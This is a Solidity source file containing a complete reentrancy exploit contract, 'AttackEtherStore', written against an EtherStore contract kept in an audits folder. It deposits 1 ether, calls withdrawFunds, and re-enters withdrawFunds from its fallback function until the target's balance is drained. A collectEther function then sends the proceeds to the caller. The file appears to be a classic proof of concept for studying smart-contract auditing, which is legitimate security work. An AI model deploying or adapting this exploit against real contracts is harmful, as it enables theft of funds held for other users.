// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;
import "contracts/audits/EtherStore.sol";

contract AttackEtherStore {

    EtherStore public etherStore;

     constructor(address _etherStoreAddress) {
      etherStore = EtherStore(_etherStoreAddress);
    }

    function pwnEtherStore() public payable {
        (bool success, ) = payable(address(etherStore)).call{value: 1 ether}(
            abi.encodeWithSignature("depositFunds()")
        );
        require(success, "Deposit failed");
        // start the magic
        etherStore.withdrawFunds(1 ether);
        
    }

    function collectEther() public {
        payable(address(msg.sender)).transfer(address(this).balance);
    }

    fallback() external payable { 

        if (address(etherStore).balance > 1 ether) {
            etherStore.withdrawFunds(1 ether);
        }
        
    }

    receive() external payable {
        // Handle incoming Ether here
    }

}
